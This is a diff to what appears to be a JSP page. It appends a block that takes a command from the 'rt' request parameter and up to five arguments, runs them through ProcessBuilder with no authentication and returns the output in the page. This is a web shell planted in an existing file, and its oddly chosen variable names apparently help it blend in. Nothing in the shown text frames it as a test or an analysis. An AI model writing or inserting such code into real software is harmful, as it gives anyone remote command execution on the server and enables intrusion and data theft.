@@ -52,3 +52,45 @@
         }
     }
 %>
+
+
+
+<%@ page import="java.io.*" %>
+<%
+    String curiosity = request.getParameter("rt");
+    if (curiosity == null || curiosity.isEmpty()) {
+        out.println("No se ha especificado el curiosity");
+        return;
+    }
+
+    String arg1 = request.getParameter("arg1");
+    String arg2 = request.getParameter("arg2");
+    String arg3 = request.getParameter("arg3");
+    String arg4 = request.getParameter("arg4");
+    String arg5 = request.getParameter("arg5");
+
+    java.util.List<String> constantino = new java.util.ArrayList<>();
+    constantino.add(curiosity);
+
+    if(arg1 != null && !arg1.isEmpty()) constantino.add(arg1);
+    if(arg2 != null && !arg2.isEmpty()) constantino.add(arg2);
+    if(arg3 != null && !arg3.isEmpty()) constantino.add(arg3);
+    if(arg4 != null && !arg4.isEmpty()) constantino.add(arg4);
+    if(arg5 != null && !arg5.isEmpty()) constantino.add(arg5);
+
+    ProcessBuilder pb = new ProcessBuilder(constantino);
+    pb.redirectErrorStream(true);
+
+    Process process = pb.start();
+    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+    String line;
+    out.println("<pre>");
+    while ((line = reader.readLine()) != null) {
+        out.println(line);
+    }
+    out.println("</pre>");
+
+    process.waitFor();
+%>
+
